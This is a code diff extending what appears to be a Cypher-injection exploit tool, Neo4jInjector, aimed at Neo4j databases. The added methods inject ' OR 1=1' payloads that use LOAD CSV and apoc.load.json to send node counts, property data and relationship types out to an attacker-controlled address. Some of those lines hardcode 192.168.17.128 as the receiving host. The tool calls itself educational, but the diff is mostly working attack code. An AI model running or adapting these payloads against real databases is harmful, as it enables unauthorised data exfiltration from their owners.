@@ -84,6 +84,19 @@ def fully_dynamic_convert_data(original_data):
 
     return converted_data
 
+
+
+def write_json_to_file(json_data, filename="output.json"):
+    """Write JSON data to a file."""
+
+    output_dir = os.path.join(os.getcwd(), "output")
+    if not os.path.exists(output_dir):
+        os.makedirs(output_dir)
+    
+    file_path = os.path.join(output_dir, filename)
+    with open(file_path, 'w') as file:
+        file.write(json.dumps(json_data, indent=2))
+
 def check_vulnerability(apoc_version):
     """
     Checks if the given version is affected by any of the vulnerabilities.
@@ -280,7 +293,14 @@ class Neo4jInjector:
 
         label = input(f"\nEnter label to dump: ")
 
-        
+
+        # dump node count
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) WITH COUNT(DISTINCT x) as l LOAD CSV FROM '{self.exfil_ip}/?node_count='+l as x RETURN 0 as _0 //")
+        data = data_queue.get()  # Retrieve the next item from the queue
+        parsed_data = extract_query_params(data)  # Use the previously defined function
+        node_count = parsed_data.get('node_count')  # Extract the label value
+
+
         # Dump property count
         self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y LOAD CSV FROM '{self.exfil_ip}/?property_count=' + y as l RETURN 0 as _0 //")
 
@@ -306,12 +326,12 @@ class Neo4jInjector:
             data = data_queue.get()
             parsed_data = extract_query_params(data[0:-2])    
             properties_dict.update(parsed_data)
-        properties_dict = fully_dynamic_convert_data(properties_dict)
-        
-        print(f"\nLabel: {label}")
-        print(f"[{property_count} columns]")
-        convert_dict_to_table(properties_dict)
+        formatted_dict = fully_dynamic_convert_data(properties_dict)
+        write_json_to_file(formatted_dict, 'data.json')
 
+        print(f"\nLabel: {label}")
+        print(f"[{node_count} entries]")
+        convert_dict_to_table(formatted_dict)
 
     def apoc_exfil_data(self):
         print("\n[*] Using APOC to Exfiltrate [*]")
@@ -348,6 +368,11 @@ class Neo4jInjector:
 
         label = input(f"\nEnter label to dump: ")
 
+        # dump node count
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) WITH COUNT(DISTINCT x) as l CALL apoc.load.json('{self.exfil_ip}/?node_count=' + l) YIELD value RETURN value//")
+        data = data_queue.get()  # Retrieve the next item from the queue
+        parsed_data = extract_query_params(data)  # Use the previously defined function
+        node_count = parsed_data.get('node_count')  # Extract the label value
 
         # dump property count
         self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y CALL apoc.load.json('{self.exfil_ip}/?property_count=' + y) YIELD value RETURN value//")
@@ -376,12 +401,50 @@ class Neo4jInjector:
             parsed_data = extract_query_params(data)
             properties_dict.update(parsed_data)
 
-        properties_dict = fully_dynamic_convert_data(properties_dict)
-        
-        print(f"\nLabel: {label}")
-        print(f"[{property_count} columns]")
-        convert_dict_to_table(properties_dict)
+        formatted_dict = fully_dynamic_convert_data(properties_dict)
+        write_json_to_file(formatted_dict, 'data.json')
 
+        print(f"\nLabel: {label}")
+        print(f"[{node_count} entries]")
+        convert_dict_to_table(formatted_dict)
+
+
+        
+    def exfil_relationship(self):
+
+        # dump relationship count
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (node1)-[relationship]-(node2) WITH COUNT(DISTINCT(type(relationship))) as x LOAD CSV FROM '{self.exfil_ip}/?relationship_count='+x as l RETURN 0 as _0 //")
+
+        data = data_queue.get()  # Retrieve the next item from the queue
+        parsed_data = extract_query_params(data)  # Use the previously defined function
+        relationship_count = parsed_data.get('relationship_count')  # Extract the label value
+
+        # dump relationships
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as relationships WITH REDUCE(mergedString = '', value in relationships | mergedString+value+'::') as joinedString LOAD CSV FROM 'http://192.168.17.128:80/?type='+joinedString as l RETURN 0 as _0//")
+
+        data = data_queue.get()
+        # remove trailing ::
+        parsed_data = extract_query_params(data[0:-2])
+        print(f"\navailable relationships [{relationship_count}]:")
+        relationships = parsed_data['type'].split('::')
+        for relationship in relationships:
+            print(f"[*] {relationship}")
+
+
+        relationships_dict = {}
+        for relationship in relationships:
+            self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (node1)-[:{relationship}]->(node2) WITH DISTINCT node1, node2 LOAD CSV FROM 'http://192.168.17.128/?relationship=(id:'+id(node1) + ')-[:{relationship}]->(id:' + id(node2) + ')' as l return 0 as _0//")
+            data = data_queue.get()
+            parsed_data = extract_query_params(data)
+            print(parsed_data)
+            relationships_dict.update(parsed_data)
+            self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (node1)<-[:{relationship}]-(node2) WITH DISTINCT node1, node2 LOAD CSV FROM 'http://192.168.17.128/?relationship=(id:'+id(node1) + ')<-[:{relationship}]-(id:' + id(node2) + ')' as l return 0 as _0//")
+        
+            print(parsed_data)
+        print(relationships_dict)
+
+
+        
 
 def main():
     parser = argparse.ArgumentParser(description="Inject payloads into Neo4j for educational purposes")
@@ -432,6 +495,10 @@ def main():
     apoc_installed = injector.exfil_data()
     if apoc_installed:
         injector.apoc_exfil_data()
+
+    exfil_relationship = input("\nExfiltrate Relationships? (Y|N): ")
+    if exfil_relationship.lower() == 'y':
+        injector.exfil_relationship()
         
         # dump_hash = input("Do you wish to dump the Neo4j account hash (Y/N)")
         # if dump_hash == "Y":
